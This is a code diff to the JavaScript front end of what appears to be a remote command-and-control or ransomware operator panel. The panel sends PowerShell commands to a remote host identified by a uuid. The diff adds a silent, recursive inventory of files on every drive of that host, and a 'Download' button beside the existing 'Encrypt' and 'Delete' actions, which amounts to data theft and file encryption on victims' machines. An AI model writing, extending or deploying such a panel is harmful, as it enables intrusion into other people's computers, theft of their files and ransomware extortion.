@@ -970,8 +970,14 @@ function set_label() {
 
 function get_file_list(e) {
   var uuid = window.location.href.split("#")[1];
-  var drive_name=e
-  var command=`(Get-ChildItem  -Path ${drive_name}:\ -Filter *.* -Recurse -Attributes Archive ).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
+  if(e=="ALL"){
+    var command=`$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object {$_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name | ConvertTo-Json`
+
+  }
+  else{
+    var command=`(Get-ChildItem  -Path ${e}:\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
+
+  }
   $.post(
     BASE_URL,
     { add_command: true, command: command, uuid: uuid, token: token },function(data){
@@ -1001,7 +1007,7 @@ function get_file_list_res(e) {
         <td class="tdf">${name_format}</td>
         <td class="tdf">${count_format}</td>
         <td class="tdf">2GB</td>
-        <td class="tdf"> <a href="javascript:void(0)"  >View </a><a href="javascript:void(0)"  >Delete </a><a href="javascript:void(0)"  >Encrypt </a></td>
+        <td class="tdf"> <a href="javascript:void(0)"  >View </a><a href="javascript:void(0)"  >Delete </a><a href="javascript:void(0)"  >Encrypt </a><a href="javascript:void(0)"  >Download </a></td>
 
        
       </tr>
@@ -1030,7 +1036,7 @@ function get_drive_list_res(e) {
        
         var template=`
  
-        <option>${name_format}</option>
+        <option class="drive_letter">${name_format}</option>
         `
       
         $("#select_drive").append(template);
@@ -1060,7 +1066,10 @@ $("#select_drive").on("change", function () {
   $(".file_res_table").css("display","none")
 
   var option = this.value;
-  if(option!="------------"){
+  if(option=="ALL"){
+    get_file_list("ALL")
+  }
+  if(option!="------------" && option!="ALL"){
     get_file_list(option)
   }
 });
